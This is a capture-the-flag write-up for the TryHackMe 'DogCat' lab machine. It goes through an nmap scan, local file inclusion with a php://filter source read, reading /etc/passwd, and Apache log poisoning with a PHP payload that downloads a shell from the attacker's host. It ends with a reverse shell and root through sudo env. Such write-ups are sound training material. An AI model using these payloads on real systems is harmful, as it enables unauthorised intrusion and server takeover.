---
title: TryHackMe - DogCat Writeup
description: My writeup on dogcat box.
categories:
 - tryhackme
tags: tryhackme, LFI
---

A pretty good box.

You can find the machine there > [DogCat](https://tryhackme.com/room/dogcat){:target="_blank"}

As always let's start with a nmap scan.

```
$ ip=10.10.113.171
$ nmap -sC -sV -oN initial $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-11 17:07 EEST
Nmap scan report for 10.10.113.171 (10.10.113.171)
Host is up (0.12s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: dogcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

When we visit the webpage gives us 2 buttons and ask `What would you like to see?`, if we press `dog` for example we can see this on URL :

`http://10.10.113.171/?view=dog`

Let's try LFI :

`http://10.10.113.171/?view=../../../etc/passwd` Gives us this error -> `Sorry, only dogs or cats are allowed.`

Let's try to add dog string before our LFI string :

`http://10.10.113.171/?view=dog../../../etc/passwd` Now we take this error -> `Warning: include(dog../../../etc/passwd.php` seems like it adds extension `.php` everytime, we can try to read the `index.php` since if we try `index` will auto add the `.php`.

In LFI we can't read .php files. That is because they get executed by the webserver, we can bypass this using `php filter`.

`http://10.10.113.171/?view=php://filter/convert.base64-encode/resource=dog../../index` Gives us a base64 string, let's decode it.

```
$ echo PCFET0NUWV..data..ZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg== | base64 -d
```

We can now read the `index.php` source code.

```php
<?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
?>
```

Let's analyze it. The most important thing in this code is this : 

```php
$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
```

I'll try to explain it, i don't code php, but i can understand php.

`isset()` function checks if a variable is set, now the critical part comes the `?` & `:` in php called ternary operator. Allows us to simplify complex conditions into one line statements.

So if the condition `isset($_GET["ext"])` is true will return `$_GET["ext"]` else will add the `.php`. So we just have to add `ext` parameter in the URL to read files.

```
$ curl -X GET "http://10.10.113.171/?view=dog../../../../../etc/passwd&ext"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

Great, now we can do LFI -> RCE by doing log poisoning. To do that we need to be able to read log files.

`http://10.10.113.171/?view=dog../../../../../var/log/apache2/access.log&ext` Bingo! Now we can do a php trick to upload our shell, if we do `<?php passthru($_GET['cmd']); ?>` we will have to wget/curl the shell, we can save our time using this trick :

```
$ nc $ip 80
GET /<?php file_put_contents('shell.php', file_get_contents('http://$your_ip/shell.php')) ?>
```

Now we have to visit the `access.log` file to activate it.

`http://10.10.174.184/?view=dog../../../../../var/log/apache2/access.log&ext`

Let's run our shell now.

`http://10.10.174.184/shell.php`

```
$ nc -lvp 6666
listening on [any] 6666 ...
$ whoami
www-data
```

Privesc is pretty easy now, let's check `sudo -l`.

```
$ sudo -l
Matching Defaults entries for www-data on f8a6b465eadb:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on f8a6b465eadb:
    (root) NOPASSWD: /usr/bin/env
```

We can run `env` as root. We can simply exploit this by doing :

```
$ sudo env bash
whoami;id
root
uid=0(root) gid=0(root) groups=0(root)
```

This one was a good one. See you!
